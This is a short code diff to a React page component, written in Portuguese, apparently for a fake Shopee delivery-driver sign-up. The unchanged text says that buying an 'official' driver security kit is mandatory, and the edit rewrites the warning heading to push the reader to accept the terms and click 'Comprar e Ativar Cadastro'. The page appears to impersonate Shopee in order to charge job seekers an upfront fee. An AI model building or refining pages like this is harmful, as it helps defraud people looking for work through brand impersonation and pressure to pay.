@@ -521,7 +521,7 @@ const Entrega: React.FC = () => {
                       </svg>
                     </div>
                     <div>
-                      <h4 className="text-red-800 font-medium text-sm">ATENÇÃO: Kit de Segurança Obrigatório</h4>
+                      <h4 className="text-red-800 font-medium text-sm"><strong>ATENÇÃO:</strong> Aceite os termos e depois clique em "Comprar e Ativar Cadastro".</h4>
                       <p className="text-red-700 text-sm mt-1">
                         O pagamento do Kit de Segurança do Entregador é <strong>obrigatório</strong> e você precisa 
                         adquirir este kit oficial para exercer a função de entregador Shopee.
